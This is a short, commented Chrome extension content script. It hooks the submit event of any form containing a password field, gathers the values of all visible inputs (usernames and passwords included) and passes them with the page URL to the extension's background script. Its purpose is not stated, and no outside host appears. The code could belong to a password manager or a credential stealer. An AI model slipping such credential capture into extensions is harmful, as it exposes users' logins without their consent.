// Finds all input fields on the page that are of type "password" and sends each to a function
document.querySelectorAll('input[type="password"]').forEach((password_field) => {
  // Listen for when form is submitted, and send the event to a function
  if (password_field.form) {
    password_field.form.addEventListener("submit", (e) => {
      /*
      Take the event and find the target (the form), find all inputs not of type "hidden" or "submit",
      and turn the output into an array
      */
      var inputs = Array.prototype.slice.call(e.target.querySelectorAll('input:not([type="hidden"]):not([type="submit"])'));
      // Turn array of inputs into an array of their values (the strings they contain)
      inputs.forEach((input, i, arr) => {
        arr[i] = input.value;
      });
      // Send a message to background script in the form "url, input: input"
      chrome.runtime.sendMessage({
        loginListener: location.href + ' ' + inputs.join(":")
      });
    }, false);
  }
});
